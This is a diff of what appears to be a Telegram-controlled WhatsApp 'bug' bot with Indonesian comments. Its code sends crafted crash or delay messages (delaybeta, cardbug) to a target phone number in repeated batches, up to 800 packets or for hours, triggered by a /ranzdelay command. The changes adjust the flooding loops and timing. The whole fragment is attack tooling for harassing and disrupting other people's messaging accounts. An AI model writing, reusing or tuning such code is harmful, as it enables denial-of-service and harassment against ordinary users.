@@ -388,35 +388,6 @@ async function CallUi(target) {
     messageId: msg.key.id
   });
 }
-async function sendBatch(target) {
-    for (let i = 0; i < 25; i++) {
-        try {
-            await Promise.all([
-                delaybeta(target), //ubah fungsi jadi fungsi yg mau lu pake
-                cardbug(target) //ubah jadi fungsi yg mau lu pake
-            ]);
-            await sleep(3000); // jeda 2 detik tiap pesan
-            console.log(chalk.red(Sending ${target}));
-        } catch (error) {
-            console.error(❌ Error saat mengirim: ${error.message});
-            await sleep(100);
-        }
-    }
-    console.log(chalk.red(✅ Selesai 1 batch (25 pesan) ke ${target}));
-}
-
-// panggil ini ke parameter command bug lu
-async function SnithFc(target) {
-    const duration = 60 * 60 * 1000;
-    const start = Date.now();
-
-    while (Date.now() - start < duration) {
-        await sendBatch(target); 
-        console.log(chalk.red(⏳ Batch selesai, lanjut batch berikutnya...));
-    }
-
-    console.log(chalk.red(✅ Selesai 1 jam mengirim pesan ke ${target}));
-}
 async function delaybeta(target, mention = false) {
 try {
     let sxo = await generateWAMessageFromContent(target, {
@@ -2228,7 +2199,8 @@ return;
 
 if (count < 800) {
 await delaybeta(target, false);
-await cardbug(target, false); // Menggunakan target dari input pengguna
+await cardbug(target, false);
+await sleep(3000) // Menggunakan target dari input pengguna
 count++;
 console.log(chalk.red(`Mengirimkan Paket ${count}/800 ke ${target}`));
    sendNext(); // Melanjutkan pengiriman
@@ -4976,7 +4948,7 @@ bot.onText(/\/ranzdelay(?:\s(.+))?/, async (msg, match) => {
 
     // Proses pengiriman bug
     for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
-        await SnithFc(formatedNumber)
+        await sendMessagesForDurationX(24, formatedNumber)
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
